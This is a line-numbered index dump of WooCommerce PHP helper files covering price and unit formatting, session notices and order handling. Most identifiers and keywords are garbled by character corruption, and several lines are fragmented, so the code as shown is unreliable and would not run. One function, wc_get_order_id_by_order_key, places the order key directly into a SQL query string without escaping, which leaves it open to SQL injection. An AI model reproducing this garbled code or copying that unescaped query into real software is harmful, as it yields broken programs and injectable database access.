 
	$woocomm”û_Œack_´oduù_v›w
() {

400  
	`wc_Œack_´oduù_v›w
();

401 
	}
}

	@includes/wc-formatting-functions.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

24 
funùiÚ
 
	$wc_§n™ize_xÚomy_Çme
Ğ
$xÚomy
 ) {

25 
$f‹»d
 = 
	`¡¹Şow”
Ğ
	`»move_acûÁs
Ğ
	`¡r¦ashes
Ğ
	`¡r_gs
Ğ
$xÚomy
 ) ) ) );

26 
$f‹»d
 = 
	`´eg_»¶aû
( '/&.+?;/', '', $filtered );

27 
$f‹»d
 = 
	`¡r_»¶aû
Ğ
	`¬¿y
( '.', '\'', '"' ), '', $filtered );

28 
$f‹»d
 = 
	`¡r_»¶aû
Ğ
	`¬¿y
( ' ', '_' ), '-', $filtered );

30  
	`­¶y_f‹rs
Ğ'§n™ize_xÚomy_Çme', 
$f‹»d
, 
$xÚomy
 );

31 
	}
}

40 
funùiÚ
 
	$wc_g‘_f’ame_äom_u¾
Ğ
$fe_u¾
 ) {

41 
$·¹s
 = 
	`·r£_u¾
Ğ
$fe_u¾
 );

42 iàĞ
	`is£t
Ğ
$·¹s
['path'] ) ) {

43  
	`ba£Çme
Ğ
$·¹s
['path'] );

45 
	}
}

57 
funùiÚ
 
	$wc_g‘_dim’siÚ
Ğ
$dim
, 
$to_un™
 ) {

59 
$äom_un™
 = 
	`¡¹Şow”
Ğ
	`g‘_İtiÚ
( 'woocommerce_dimension_unit' ) );

60 
$to_un™
 = 
	`¡¹Şow”
( $to_unit );

63 iàĞ
$äom_un™
 !=ğ
$to_un™
 ) {

65  
$äom_un™
 ) {

67 
$dim
 *= 2.54;

70 
$dim
 *= 100;

73 
$dim
 *= 0.1;

76 
$dim
 *= 91.44;

81  
$to_un™
 ) {

83 
$dim
 *= 0.3937;

86 
$dim
 *= 0.01;

89 
$dim
 *= 10;

92 
$dim
 *= 0.010936133;

96  ( 
$dim
 < 0 ) ? 0 : $dim;

97 
	}
}

109 
funùiÚ
 
	$wc_g‘_weight
Ğ
$weight
, 
$to_un™
 ) {

111 
$äom_un™
 = 
	`¡¹Şow”
Ğ
	`g‘_İtiÚ
('woocommerce_weight_unit') );

112 
$to_un™
 = 
	`¡¹Şow”
( $to_unit );

115 iàĞ
$äom_un™
 !=ğ
$to_un™
 ) {

117  
$äom_un™
 ) {

119 
$weight
 *= 0.001;

122 
$weight
 *= 0.4536;

125 
$weight
 *= 0.0283;

130  
$to_un™
 ) {

132 
$weight
 *= 1000;

135 
$weight
 *= 2.2046;

138 
$weight
 *= 35.274;

142  ( 
$weight
 < 0 ) ? 0 : $weight;

143 
	}
}

152 
funùiÚ
 
	$wc_Œim_z”os
Ğ
$´iû
 ) {

153  
	`´eg_»¶aû
Ğ'/' . 
	`´eg_quÙe
Ğ
	`g‘_İtiÚ
Ğ'woocomm”û_´iû_decim®_£p' ), '/' ) . '0++$/', '', 
$´iû
 );

154 
	}
}

163 
funùiÚ
 
	$wc_round_x_tÙ®
Ğ
$x
 ) {

164 
$dp
 = (è
	`g‘_İtiÚ
( 'woocommerce_price_num_decimals' );

166 iàĞ
	`v”siÚ_com·»
Ğ
	`phpv”siÚ
(), '5.3', '<' ) ) {

167 
$x
 = 
	`round
Ğ$x, 
$dp
 );

169 
$x
 = 
	`round
Ğ$x, 
$dp
, 
WC_TAX_ROUNDING_MODE
 );

171  
$x
;

172 
	}
}

184 
funùiÚ
 
	$wc_fÜm©_decim®
Ğ
$numb”
, 
$dp
 = 
çl£
, 
$Œim_z”os
 = false ) {

186 iàĞ! 
	`is_æßt
Ğ
$numb”
 ) ) {

187 
$loÿË
 = 
	`loÿËcÚv
();

188 
$decim®s
 = 
	`¬¿y
Ğ
	`g‘_İtiÚ
Ğ'woocomm”û_´iû_decim®_£p' ), 
$loÿË
['decimal_point'], $locale['mon_decimal_point'] );

189 
$numb”
 = 
	`wc_ş—n
Ğ
	`¡r_»¶aû
Ğ
$decim®s
, '.', $number ) );

193 iàĞ
$dp
 !=ğ
çl£
 ) {

194 
$dp
 = 
	`štv®
Ğ$d°=ğ"" ? 
	`g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) : $dp );

195 
$numb”
 = 
	`numb”_fÜm©
Ğ
	`æßtv®
Ğ$numb” ), 
$dp
, '.', '' );

198 iàĞ
$Œim_z”os
 && 
	`¡r¡r
Ğ
$numb”
, '.' ) ) {

199 
$numb”
 = 
	`¹rim
(„trim( $number, '0' ), '.' );

202  
$numb”
;

203 
	}
}

210 
funùiÚ
 
	$wc_æßt_to_¡ršg
Ğ
$æßt
 ) {

211 iàĞ! 
	`is_æßt
Ğ
$æßt
 ) ) {

212  
$æßt
;

215 
$loÿË
 = 
	`loÿËcÚv
();

216 
$¡ršg
 = 
	`¡rv®
Ğ
$æßt
 );

217 
$¡ršg
 = 
	`¡r_»¶aû
Ğ
$loÿË
['decimal_point'], '.', $string );

219  
$¡ršg
;

220 
	}
}

227 
funùiÚ
 
	$wc_fÜm©_loÿlized_´iû
Ğ
$v®ue
 ) {

228  
	`¡r_»¶aû
Ğ'.', 
	`g‘_İtiÚ
Ğ'woocomm”û_´iû_decim®_£p' ), 
	`¡rv®
Ğ
$v®ue
 ) );

229 
	}
}

236 
funùiÚ
 
	$wc_fÜm©_loÿlized_decim®
Ğ
$v®ue
 ) {

237 
$loÿË
 = 
	`loÿËcÚv
();

238  
	`¡r_»¶aû
Ğ'.', 
$loÿË
['decim®_pošt'], 
	`¡rv®
Ğ
$v®ue
 ) );

239 
	}
}

248 
funùiÚ
 
	$wc_ş—n
Ğ
$v¬
 ) {

249  
	`§n™ize_‹xt_f›ld
Ğ
$v¬
 );

250 
	}
}

260 
funùiÚ
 
	$wc_¬¿y_ov”Ïy
Ğ
$a1
, 
$a2
 ) {

261 
	`fÜ—ch
Ğ
$a1
 
as
 
$k
 => 
$v
 ) {

262 iàĞ! 
	`¬¿y_key_exi¡s
Ğ
$k
, 
$a2
 ) ) {

265 iàĞ
	`is_¬¿y
Ğ
$v
 ) && is_¬¿yĞ
$a2
[ 
$k
 ] ) ) {

266 
$a1
[ 
$k
 ] = 
	`wc_¬¿y_ov”Ïy
Ğ
$v
, 
$a2
[ $k ] );

268 
$a1
[ 
$k
 ] = 
$a2
[ $k ];

271  
$a1
;

272 
	}
}

279 
funùiÚ
 
	$g‘_woocomm”û_´iû_fÜm©
() {

280 
$cu¼’cy_pos
 = 
	`g‘_İtiÚ
( 'woocommerce_currency_pos' );

282  
$cu¼’cy_pos
 ) {

284 
$fÜm©
 = '%1$s%2$s';

287 
$fÜm©
 = '%2$s%1$s';

290 
$fÜm©
 = '%1$s&nbsp;%2$s';

293 
$fÜm©
 = '%2$s&nbsp;%1$s';

297  
	`­¶y_f‹rs
Ğ'woocomm”û_´iû_fÜm©', 
$fÜm©
, 
$cu¼’cy_pos
 );

298 
	}
}

308 
funùiÚ
 
wc_´iû
Ğ
$´iû
, 
$¬gs
 = 
	$¬¿y
() ) {

309 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

311 ), 
$¬gs
 ) );

313 
$»tuº
 = '';

314 
$num_decim®s
 = 
	`absšt
Ğ
	`g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) );

315 
$cu¼’cy
 = 
	`is£t
Ğ
$¬gs
['currency'] ) ? $args['currency'] : '';

316 
$cu¼’cy_symbŞ
 = 
	`g‘_woocomm”û_cu¼’cy_symbŞ
(
$cu¼’cy
);

317 
$decim®_£p
 = 
	`wp_¥ecŸlch¬s_decode
Ğ
	`¡r¦ashes
Ğ
	`g‘_İtiÚ
Ğ'woocomm”û_´iû_decim®_£p' ) ), 
ENT_QUOTES
 );

318 
$thou§nds_£p
 = 
	`wp_¥ecŸlch¬s_decode
Ğ
	`¡r¦ashes
Ğ
	`g‘_İtiÚ
Ğ'woocomm”û_´iû_thou§nd_£p' ) ), 
ENT_QUOTES
 );

320 
$´iû
 = 
	`­¶y_f‹rs
Ğ'¿w_woocomm”û_´iû', 
	`æßtv®
( $price ) );

321 
$´iû
 = 
	`­¶y_f‹rs
Ğ'fÜm©‹d_woocomm”û_´iû', 
	`numb”_fÜm©
Ğ$´iû, 
$num_decim®s
, 
$decim®_£p
, 
$thou§nds_£p
 ), $price, $num_decimals, $decimal_sep, $thousands_sep );

323 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_´iû_Œim_z”os', 
çl£
 ) && 
$num_decim®s
 > 0 ) {

324 
$´iû
 = 
	`wc_Œim_z”os
( $price );

327 
$»tuº
 = '<¥ª cÏss="amouÁ">' . 
	`¥rštf
Ğ
	`g‘_woocomm”û_´iû_fÜm©
(), 
$cu¼’cy_symbŞ
, 
$´iû
 ) . '</span>';

329 iàĞ
$ex_x_Ïb–
 && 
	`g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) {

330 
$»tuº
 .ğ' <sm®l>' . 
	`WC
()->
couÁr›s
->
	`ex_x_Ü_v©
() . '</small>';

333  
$»tuº
;

334 
	}
}

345 
funùiÚ
 
	$wc_Ët_to_num
Ğ
$size
 ) {

346 
$l
 = 
	`sub¡r
Ğ
$size
, -1 );

347 
$»t
 = 
	`sub¡r
Ğ
$size
, 0, -1 );

348  
	`¡¹ouµ”
Ğ
$l
 ) ) {

350 
$»t
 *= 1024;

352 
$»t
 *= 1024;

354 
$»t
 *= 1024;

356 
$»t
 *= 1024;

358 
$»t
 *= 1024;

360  
$»t
;

361 
	}
}

369 
funùiÚ
 
	$wc_d©e_fÜm©
() {

370  
	`­¶y_f‹rs
Ğ'woocomm”û_d©e_fÜm©', 
	`g‘_İtiÚ
( 'date_format' ) );

371 
	}
}

379 
funùiÚ
 
	$wc_time_fÜm©
() {

380  
	`­¶y_f‹rs
Ğ'woocomm”û_time_fÜm©', 
	`g‘_İtiÚ
( 'time_format' ) );

381 
	}
}

393 
funùiÚ
 
	$wc_timezÚe_¡ršg
() {

396 iàĞ
$timezÚe
 = 
	`g‘_İtiÚ
( 'timezone_string' ) ) {

397  
$timezÚe
;

401 iàĞ0 ==ğĞ
$utc_off£t
 = 
	`g‘_İtiÚ
( 'gmt_offset', 0 ) ) ) {

406 
$utc_off£t
 *= 3600;

409 
$timezÚe
 = 
	`timezÚe_Çme_äom_abbr
Ğ'', 
$utc_off£t
 );

412 iàĞ
çl£
 ==ğ
$timezÚe
 ) {

414 
$is_d¡
 = 
	`d©e
( 'I' );

416 
	`fÜ—ch
 ( 
	`timezÚe_abb»vŸtiÚs_li¡
(è
as
 
$abbr
 ) {

417 
	`fÜ—ch
 ( 
$abbr
 
as
 
$c™y
 ) {

419 iàĞ
$c™y
['d¡'] =ğ
$is_d¡
 && $c™y['off£t'] =ğ
$utc_off£t
 ) {

420  
$c™y
['timezone_id'];

428 
	}
}

430 iàĞ! 
funùiÚ_exi¡s
( 'wc_rgb_from_hex' ) ) {

439 
funùiÚ
 
wc_rgb_äom_hex
Ğ
$cŞÜ
 ) {

440 
	g$cŞÜ
 = 
¡r_»¶aû
Ğ'#', '', 
$cŞÜ
 );

442 
	g$cŞÜ
 = 
´eg_»¶aû
Ğ'~^(.)(.)(.)$~', '$1$1$2$2$3$3', 
$cŞÜ
 );

444 
	g$rgb
['R'] = 
hexdec
Ğ
$cŞÜ
{0}.$color{1} );

445 
	g$rgb
['G'] = 
hexdec
Ğ
$cŞÜ
{2}.$color{3} );

446 
	g$rgb
['B'] = 
hexdec
Ğ
$cŞÜ
{4}.$color{5} );

447  
	g$rgb
;

451 iàĞ! 
funùiÚ_exi¡s
( 'wc_hex_darker' ) ) {

461 
funùiÚ
 
wc_hex_d¬k”
Ğ
$cŞÜ
, 
$çùÜ
 = 30 ) {

462 
$ba£
 = 
wc_rgb_äom_hex
Ğ
$cŞÜ
 );

463 
	g$cŞÜ
 = '#';

465 
fÜ—ch
 (
$ba£
 
as
 
$k
 => 
$v
) :

466 
$amouÁ
 = 
$v
 / 100;

467 
	g$amouÁ
 = 
round
(
$amouÁ
 * 
$çùÜ
);

468 
	g$Ãw_decim®
 = 
$v
 - 
$amouÁ
;

470 
	g$Ãw_hex_compÚ’t
 = 
dechex
(
$Ãw_decim®
);

471 if(
¡¾’
(
$Ãw_hex_compÚ’t
) < 2) :

472 
$Ãw_hex_compÚ’t
 = "0".$new_hex_component;

473 
	g’dif
;

474 
	g$cŞÜ
 .ğ
$Ãw_hex_compÚ’t
;

475 
	g’dfÜ—ch
;

477  
	g$cŞÜ
;

481 iàĞ! 
funùiÚ_exi¡s
( 'wc_hex_lighter' ) ) {

491 
funùiÚ
 
wc_hex_ligh‹r
Ğ
$cŞÜ
, 
$çùÜ
 = 30 ) {

492 
$ba£
 = 
wc_rgb_äom_hex
Ğ
$cŞÜ
 );

493 
	g$cŞÜ
 = '#';

495 
fÜ—ch
 (
$ba£
 
as
 
$k
 => 
$v
) :

496 
$amouÁ
 = 255 - 
$v
;

497 
	g$amouÁ
 = 
$amouÁ
 / 100;

498 
	g$amouÁ
 = 
round
(
$amouÁ
 * 
$çùÜ
);

499 
	g$Ãw_decim®
 = 
$v
 + 
$amouÁ
;

501 
	g$Ãw_hex_compÚ’t
 = 
dechex
(
$Ãw_decim®
);

502 if(
¡¾’
(
$Ãw_hex_compÚ’t
) < 2) :

503 
$Ãw_hex_compÚ’t
 = "0".$new_hex_component;

504 
	g’dif
;

505 
	g$cŞÜ
 .ğ
$Ãw_hex_compÚ’t
;

506 
	g’dfÜ—ch
;

508  
	g$cŞÜ
;

512 iàĞ! 
funùiÚ_exi¡s
( 'wc_light_or_dark' ) ) {

523 
funùiÚ
 
wc_light_Ü_d¬k
Ğ
$cŞÜ
, 
$d¬k
 = '#000000', 
$light
 = '#FFFFFF' ) {

525 
$hex
 = 
¡r_»¶aû
Ğ'#', '', 
$cŞÜ
 );

527 
	g$c_r
 = 
hexdec
Ğ
sub¡r
Ğ
$hex
, 0, 2 ) );

528 
	g$c_g
 = 
hexdec
Ğ
sub¡r
Ğ
$hex
, 2, 2 ) );

529 
	g$c_b
 = 
hexdec
Ğ
sub¡r
Ğ
$hex
, 4, 2 ) );

530 
	g$brighŠess
 = ( ( 
$c_r
 * 299 ) + ( 
$c_g
 * 587 ) + ( 
$c_b
 * 114 ) ) / 1000;

532  
	g$brighŠess
 > 155 ? 
	g$d¬k
 : 
$light
;

536 iàĞ! 
funùiÚ_exi¡s
( 'wc_format_hex' ) ) {

545 
funùiÚ
 
wc_fÜm©_hex
Ğ
$hex
 ) {

547 
	g$hex
 = 
Œim
Ğ
¡r_»¶aû
Ğ'#', '', 
$hex
 ) );

549 iàĞ
¡¾’
Ğ
$hex
 ) == 3 ) {

550 
$hex
 = $hex[0] . $hex[0] . $hex[1] . $hex[1] . $hex[2] . $hex[2];

553 iàĞ
	g$hex
 )  '#' . $hex;

564 
funùiÚ
 
	$wc_fÜm©_po¡code
Ğ
$po¡code
, 
$couÁry
 ) {

565 
$po¡code
 = 
	`¡¹ouµ”
(
	`Œim
($postcode));

566 
$po¡code
 = 
	`Œim
(
	`´eg_»¶aû
('/[\s]/', '', $postcode));

568 iàĞ
	`š_¬¿y
Ğ
$couÁry
, 
	`¬¿y
('GB', 'CA') ) ) {

569 
$po¡code
 = 
	`Œim
Ğ
	`sub¡r_»¶aû
( $postcode, ' ', -3, 0 ) );

572  
$po¡code
;

573 
	}
}

582 
funùiÚ
 
	$wc_fÜm©_phÚe_numb”
Ğ
$‹l
 ) {

583 
$‹l
 = 
	`¡r_»¶aû
( '.', '-', $tel );

584  
$‹l
;

585 
	}
}

	@includes/wc-notice-functions.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

22 
funùiÚ
 
wc_nÙiû_couÁ
Ğ
$nÙiû_ty³
 = '' ) {

23 
$nÙiû_couÁ
 = 0;

24 
	g$®l_nÙiûs
 = 
WC
()->
£ssiÚ
->
g‘
Ğ'wc_nÙiûs', 
¬¿y
() );

26 iàĞ
is£t
Ğ
$®l_nÙiûs
[
$nÙiû_ty³
] ) ) {

28 
	g$nÙiû_couÁ
 = 
absšt
ĞĞ
$®l_nÙiûs
[
$nÙiû_ty³
] ) );

30 } 
–£if
 ( 
em±y
Ğ
$nÙiû_ty³
 ) ) {

32 
fÜ—ch
 ( 
$®l_nÙiûs
 
as
 
$nÙiûs
 ) {

33 
	g$nÙiû_couÁ
 +ğ
absšt
ĞĞ
$®l_nÙiûs
 ) );

38  
	g$nÙiû_couÁ
;

48 
funùiÚ
 
wc_has_nÙiû
Ğ
$mes§ge
, 
$nÙiû_ty³
 = 'success' ) {

49 
$nÙiûs
 = 
WC
()->
£ssiÚ
->
g‘
Ğ'wc_nÙiûs', 
¬¿y
() );

50 
	g$nÙiûs
 = 
is£t
Ğ
$nÙiûs
[ 
$nÙiû_ty³
 ] ) ? $nÙiûs[ $nÙiû_ty³ ] : 
¬¿y
();

51  
¬¿y_£¬ch
Ğ
$mes§ge
, 
$nÙiûs
 ) !=ğ
çl£
;

60 
funùiÚ
 
wc_add_nÙiû
Ğ
$mes§ge
, 
$nÙiû_ty³
 = 'success' ) {

62 
$nÙiûs
 = 
WC
()->
£ssiÚ
->
g‘
Ğ'wc_nÙiûs', 
¬¿y
() );

65 iàĞ'sucûss' ==ğ
$nÙiû_ty³
 )

66 
$mes§ge
 = 
­¶y_f‹rs
( 'woocommerce_add_message', $message );

68 
	g$nÙiûs
[
$nÙiû_ty³
][] = 
­¶y_f‹rs
Ğ'woocomm”û_add_' . $nÙiû_ty³, 
$mes§ge
 );

70 
WC
()->
	g£ssiÚ
->
£t
Ğ'wc_nÙiûs', 
$nÙiûs
 );

78 
funùiÚ
 
	$wc_ş—r_nÙiûs
() {

79 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'wc_nÙiûs', 
nuÎ
 );

80 
	}
}

87 
funùiÚ
 
	$wc_´št_nÙiûs
() {

89 
$®l_nÙiûs
 = 
	`WC
()->
£ssiÚ
->
	`g‘
Ğ'wc_nÙiûs', 
	`¬¿y
() );

90 
$nÙiû_ty³s
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_nÙiû_ty³s', 
	`¬¿y
( 'error', 'success', 'notice' ) );

92 
	`fÜ—ch
 ( 
$nÙiû_ty³s
 
as
 
$nÙiû_ty³
 ) {

93 iàĞ
	`wc_nÙiû_couÁ
Ğ
$nÙiû_ty³
 ) > 0 ) {

94 
	`wc_g‘_‹m¶©e
Ğ"nÙiûs/{$nÙiû_ty³}.php", 
	`¬¿y
(

95 'mes§ges' => 
$®l_nÙiûs
[
$nÙiû_ty³
]

100 
	`wc_ş—r_nÙiûs
();

101 
	}
}

102 
add_aùiÚ
( 'woocommerce_before_shop_loop', 'wc_print_notices', 10 );

103 
add_aùiÚ
( 'woocommerce_before_single_product', 'wc_print_notices', 10 );

111 
funùiÚ
 
wc_´št_nÙiû
Ğ
$mes§ge
, 
$nÙiû_ty³
 = 'success' ) {

113 iàĞ'sucûss' ==ğ
$nÙiû_ty³
 )

114 
$mes§ge
 = 
­¶y_f‹rs
( 'woocommerce_add_message', $message );

116 
wc_g‘_‹m¶©e
Ğ"nÙiûs/{$nÙiû_ty³}.php", 
¬¿y
(

117 'mes§ges' => 
¬¿y
Ğ
­¶y_f‹rs
Ğ'woocomm”û_add_' . 
$nÙiû_ty³
, 
$mes§ge
 ) )

126 
funùiÚ
 
wc_g‘_nÙiûs
Ğ
$nÙiû_ty³
 = '' ) {

128 
$®l_nÙiûs
 = 
WC
()->
£ssiÚ
->
g‘
Ğ'wc_nÙiûs', 
¬¿y
() );

130 iàĞ
em±y
 ( 
$nÙiû_ty³
 ) ) {

131 
	g$nÙiûs
 = 
$®l_nÙiûs
;

132 } 
–£if
 ( 
is£t
Ğ
$®l_nÙiûs
[
$nÙiû_ty³
] ) ) {

133 
	g$nÙiûs
 = 
$®l_nÙiûs
[
$nÙiû_ty³
];

135 
	g$nÙiûs
 = 
¬¿y
();

138  
	g$nÙiûs
;

	@includes/wc-order-functions.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

22 
funùiÚ
 
	$wc_g‘_Üd”_id_by_Üd”_key
Ğ
$Üd”_key
 ) {

23 
glob®
 
$wpdb
;

26 
$Üd”_id
 = 
$wpdb
->
	`g‘_v¬
( "SELECT…ost_id FROM {$wpdb->prefix}postmeta WHERE meta_key = '_order_key' AND meta_value = '{$order_key}'" );

28  
$Üd”_id
;

29 
	}
}

40 
funùiÚ
 
	$wc_dowÆßdabË_fe_³rmissiÚ
Ğ
$dowÆßd_id
, 
$´oduù_id
, 
$Üd”
 ) {

41 
glob®
 
$wpdb
;

43 
$u£r_ema
 = 
	`§n™ize_ema
Ğ
$Üd”
->
blšg_ema
 );

44 
$lim™
 = 
	`Œim
Ğ
	`g‘_po¡_m‘a
Ğ
$´oduù_id
, '_dowÆßd_lim™', 
Œue
 ) );

45 
$expœy
 = 
	`Œim
Ğ
	`g‘_po¡_m‘a
Ğ
$´oduù_id
, '_dowÆßd_expœy', 
Œue
 ) );

47 
$lim™
 = 
	`em±y
Ğ$lim™ ) ? '' : 
	`absšt
( $limit );

50 
$expœy
 = 
	`em±y
Ğ$expœy ) ? 
nuÎ
 : 
	`absšt
( $expiry );

52 iàĞ
$expœy
 ) {

53 
$Üd”_com¶‘ed_d©e
 = 
	`d©e_i18n
Ğ"Y-m-d", 
	`¡¹Ùime
Ğ
$Üd”
->
com¶‘ed_d©e
 ) );

54 
$expœy
 = 
	`d©e_i18n
Ğ"Y-m-d", 
	`¡¹Ùime
Ğ
$Üd”_com¶‘ed_d©e
 . ' + ' . $expiry . ' DAY' ) );

57 
$d©a
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_dowÆßdabË_fe_³rmissiÚ_d©a', 
	`¬¿y
(

58 'dowÆßd_id' => 
$dowÆßd_id
,

59 '´oduù_id' => 
$´oduù_id
,

60 'u£r_id' => 
	`absšt
Ğ
$Üd”
->
u£r_id
 ),

61 'u£r_ema' => 
$u£r_ema
,

62 'Üd”_id' => 
$Üd”
->
id
,

63 'Üd”_key' => 
$Üd”
->
Üd”_key
,

64 'dowÆßds_»maššg' => 
$lim™
,

65 'acûss_g¿Áed' => 
	`cu¼’t_time
( 'mysql' ),

69 
$fÜm©
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_dowÆßdabË_fe_³rmissiÚ_fÜm©', 
	`¬¿y
(

79 ), 
$d©a
);

81 iàĞ! 
	`is_nuÎ
Ğ
$expœy
 ) ) {

82 
$d©a
['acûss_expœes'] = 
$expœy
;

83 
$fÜm©
[] = '%s';

87 
$»suÉ
 = 
$wpdb
->
	`š£¹
Ğ$wpdb->
´efix
 . 'woocommerce_downloadable_product_permissions',

88 
$d©a
,

89 
$fÜm©


92 
	`do_aùiÚ
Ğ'woocomm”û_g¿Á_´oduù_dowÆßd_acûss', 
$d©a
 );

94  
$»suÉ
 ? 
$wpdb
->
š£¹_id
 : 
çl£
;

95 
	}
}

104 
funùiÚ
 
	$wc_dowÆßdabË_´oduù_³rmissiÚs
Ğ
$Üd”_id
 ) {

105 iàĞ
	`g‘_po¡_m‘a
Ğ
$Üd”_id
, '_dowÆßd_³rmissiÚs_g¿Áed', 
Œue
 ) == 1 ) {

109 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

111 iàĞ
$Üd”
->
¡©us
 =ğ'´oûssšg' && 
	`g‘_İtiÚ
( 'woocommerce_downloads_grant_access_after_payment' ) == 'no' ) {

115 iàĞĞ
$Üd”
->
	`g‘_™ems
() ) > 0 ) {

116 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_™ems
(è
as
 
$™em
 ) {

117 
$_´oduù
 = 
$Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 );

119 iàĞ
$_´oduù
 && $_´oduù->
	`exi¡s
(è&& $_´oduù->
	`is_dowÆßdabË
() ) {

120 
$dowÆßds
 = 
$_´oduù
->
	`g‘_fes
();

122 
	`fÜ—ch
 ( 
	`¬¿y_keys
Ğ
$dowÆßds
 ) 
as
 
$dowÆßd_id
 ) {

123 
	`wc_dowÆßdabË_fe_³rmissiÚ
Ğ
$dowÆßd_id
, 
$™em
['v¬ŸtiÚ_id'] > 0 ? $™em['v¬ŸtiÚ_id'] : $™em['´oduù_id'], 
$Üd”
 );

129 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_download_permissions_granted', 1 );

131 
	`do_aùiÚ
Ğ'woocomm”û_g¿Á_´oduù_dowÆßd_³rmissiÚs', 
$Üd”_id
 );

132 
	}
}

134 
add_aùiÚ
( 'woocommerce_order_status_completed', 'wc_downloadable_product_permissions' );

135 
add_aùiÚ
( 'woocommerce_order_status_processing', 'wc_downloadable_product_permissions' );

146 
funùiÚ
 
	$wc_add_Üd”_™em
Ğ
$Üd”_id
, 
$™em
 ) {

147 
glob®
 
$wpdb
;

149 
$Üd”_id
 = 
	`absšt
( $order_id );

151 iàĞ! 
$Üd”_id
 )

152  
çl£
;

154 
$deçuÉs
 = 
	`¬¿y
(

159 
$™em
 = 
	`wp_·r£_¬gs
Ğ$™em, 
$deçuÉs
 );

161 
$wpdb
->
	`š£¹
(

162 
$wpdb
->
´efix
 . "woocommerce_order_items",

163 
	`¬¿y
(

164 'Üd”_™em_Çme' => 
$™em
['order_item_name'],

165 'Üd”_™em_ty³' => 
$™em
['order_item_type'],

166 'Üd”_id' => 
$Üd”_id


168 
	`¬¿y
(

173 
$™em_id
 = 
	`absšt
Ğ
$wpdb
->
š£¹_id
 );

175 
	`do_aùiÚ
Ğ'woocomm”û_Ãw_Üd”_™em', 
$™em_id
, 
$™em
, 
$Üd”_id
 );

177  
$™em_id
;

178 
	}
}

187 
funùiÚ
 
	$wc_d–‘e_Üd”_™em
Ğ
$™em_id
 ) {

188 
glob®
 
$wpdb
;

190 
$™em_id
 = 
	`absšt
( $item_id );

192 iàĞ! 
$™em_id
 )

193  
çl£
;

195 
	`do_aùiÚ
Ğ'woocomm”û_befÜe_d–‘e_Üd”_™em', 
$™em_id
 );

197 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_Üd”_™em WHERE ord”_™em_id = %d", 
$™em_id
 ) );

198 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_Üd”_™emm‘¨WHERE ord”_™em_id = %d", 
$™em_id
 ) );

200 
	`do_aùiÚ
Ğ'woocomm”û_d–‘e_Üd”_™em', 
$™em_id
 );

202  
Œue
;

203 
	}
}

215 
funùiÚ
 
wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$´ev_v®ue
 = '' ) {

216  
upd©e_m‘ad©a
Ğ'Üd”_™em', 
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$´ev_v®ue
 );

229 
funùiÚ
 
	$wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$unique
 = 
çl£
 ) {

230  
	`add_m‘ad©a
Ğ'Üd”_™em', 
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$unique
 );

231 
	}
}

243 
funùiÚ
 
wc_d–‘e_Üd”_™em_m‘a
Ğ
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
 = '', 
$d–‘e_®l
 = 
çl£
 ) {

244  
d–‘e_m‘ad©a
Ğ'Üd”_™em', 
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$d–‘e_®l
 );

256 
funùiÚ
 
	$wc_g‘_Üd”_™em_m‘a
Ğ
$™em_id
, 
$key
, 
$sšgË
 = 
Œue
 ) {

257  
	`g‘_m‘ad©a
Ğ'Üd”_™em', 
$™em_id
, 
$key
, 
$sšgË
 );

258 
	}
}

266 
funùiÚ
 
	$wc_ÿnûl_uÅaid_Üd”s
() {

267 
glob®
 
$wpdb
;

269 
$h–d_du¿tiÚ
 = 
	`g‘_İtiÚ
( 'woocommerce_hold_stock_minutes' );

271 iàĞ
$h–d_du¿tiÚ
 < 1 || 
	`g‘_İtiÚ
( 'woocommerce_manage_stock' ) != 'yes' )

274 
$d©e
 = 
	`d©e
Ğ"Y-m-d H:i:s", 
	`¡¹Ùime
Ğ'-' . 
	`absšt
Ğ
$h–d_du¿tiÚ
 ) . ' MINUTES', 
	`cu¼’t_time
( 'timestamp' ) ) );

276 
$uÅaid_Üd”s
 = 
$wpdb
->
	`g‘_cŞ
Ğ$wpdb->
	`´•¬e
( "

277 
SELECT
 
po¡s
.
ID


278 
FROM
 {
$wpdb
->
po¡s
} 
AS
…osts

279 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_»ÏtiÚshs
} 
AS
 
»l
 
ON
 
po¡s
.
ID
ô–.
objeù_ID


280 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_xÚomy
} 
AS
 
x
 
	`USING
Ğ
‹rm_xÚomy_id
 )

281 
LEFT
 
JOIN
 {
$wpdb
->
‹rms
} 
AS
 
‹rm
 
	`USING
Ğ
‹rm_id
 )

283 
WHERE
 
po¡s
.
po¡_ty³
 = 'shop_order'

284 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

285 
AND
 
x
.
xÚomy
 = 'shop_order_status'

286 
AND
 
‹rm
.
¦ug
 = 'pending'

287 
AND
 
po¡s
.
po¡_modif›d
 < %
s


290 iàĞ
$uÅaid_Üd”s
 ) {

291 
	`fÜ—ch
 ( 
$uÅaid_Üd”s
 
as
 
$uÅaid_Üd”
 ) {

292 
$Üd”
 = 
